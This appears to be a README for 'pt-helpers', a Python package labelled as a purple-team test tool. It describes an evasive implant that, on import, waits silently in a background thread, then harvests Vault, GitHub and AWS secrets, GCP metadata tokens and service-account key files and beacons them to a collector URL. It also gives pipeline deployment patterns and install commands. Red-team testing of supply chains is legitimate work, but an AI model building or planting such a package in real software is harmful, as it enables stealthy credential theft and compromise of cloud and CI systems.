# pt-helpers — Variant C (Evasive)

## Package Information

- **Name**: `pt-helpers` (import `pt_helpers`)
- **Version**: 1.1.0
- **Detection Level**: Hard (evasive — production-ready)
- **Purpose**: Purple team testing — demonstrates a minimal-footprint package

## Characteristics

- Clean, legitimate-looking code (`run_init`, `_init`, `_collect_cloud_data`)
- Silent execution (no output, all errors swallowed)
- 30–150 second random delay
- Background daemon thread
- Minimal footprint (~3.5 KB wheel)
- Harvests 4 critical environment variables (Vault, GitHub, AWS) + GCP metadata (token, service account, project)
- Production-tested design (proven in Test Case 3)

## What It Harvests

4 critical environment variables (Vault, GitHub, AWS), GCP metadata (token, service
account, project), and — via path-following — the contents of
`GOOGLE_APPLICATION_CREDENTIALS` (full service-account key JSON) and
`VAULT_TOKEN_FILE` (ephemeral Vault token) when those files exist.

## Deployment (Test Case 4)

**Pattern 1 — deploy-time (GCP host)**: the `demo-app-py-wheel` pipeline fetches the
wheel from Artifactory (`pt_team-pypi-local`), the `pt_pkg` Ansible role installs it
from the local file on the host, and the verify task imports it.
Trigger with `VERSION=pt-helpers`.

**Pattern 2 — build-time (Jenkins agent)**: the `demo-app-py-sdist` pipeline installs
the package from GitHub (`git+https://github.com/h0useh3ad/pt-helpers.git@v1.1.0`)
in the build pod and imports it there, harvesting the build-time credential files.
Trigger with `VERSION=pt-helpers` and `TERRAFORM_COMMAND=skip`.

## Manual Test (any host with the wheel)

```bash
pip3 install --no-index pt_helpers-1.0.0-py3-none-any.whl
python3 -c "import pt_helpers; import time; time.sleep(180)"
```

The payload runs in a daemon thread after a 30–150 second delay — keep the importing
process alive past the delay or the thread dies with it and no beacon is sent.

Beacon: `https://collector.purple-test.com/0cfd83d5d513beae/beacon` — silent, arrives
30–150 seconds after the import. Structure:

```json
{"ts": ..., "host": "...", "runtime": {"version": "...", "platform": "..."},
 "data": {"token": "...", "service": "...", "project": "...", "VAULT_TOKEN": "...", ...}}
```

**Authorization Required**: Use only on systems where you have written authorization.
